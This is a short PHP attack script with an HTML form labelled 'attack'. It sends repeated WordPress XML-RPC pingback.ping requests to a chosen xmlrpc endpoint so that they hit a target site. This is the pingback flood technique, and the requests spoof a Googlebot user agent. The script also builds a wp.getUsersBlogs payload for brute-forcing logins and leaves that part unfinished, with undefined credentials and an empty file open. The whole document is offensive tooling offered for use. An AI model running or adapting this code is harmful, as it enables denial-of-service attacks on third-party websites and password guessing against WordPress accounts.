<form method="GET">
	<input type="text" name="url" placeholder="xmlrpc">
	<input type="text" name="base" placeholder="page">
	<input type="text" name="target" placeholder="target">
	<input type="text" name="count" placeholder="count">
	<input type="submit" name="go" value="attack">
</form>

<?php

$url    = $_GET['url']; 
$base   = $_GET['base'];
$target = $_GET['target'];
$count  = $_GET['count'];
for ($i=0; $i < $count; $i++) { 
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_USERAGENT, "Googlebot/2.1 (+http://www.google.com/bot.html)");
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/xml'));
	curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
	curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS,"<?xml version='1.0' encoding='iso-8859-1'?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>$target</string></value></param><param><value><string>$base</string></value></param></params></methodCall>");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	$data = curl_exec($ch);
	print($data);
}

$brute = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>";

$file = fopen("", 'r');


?>
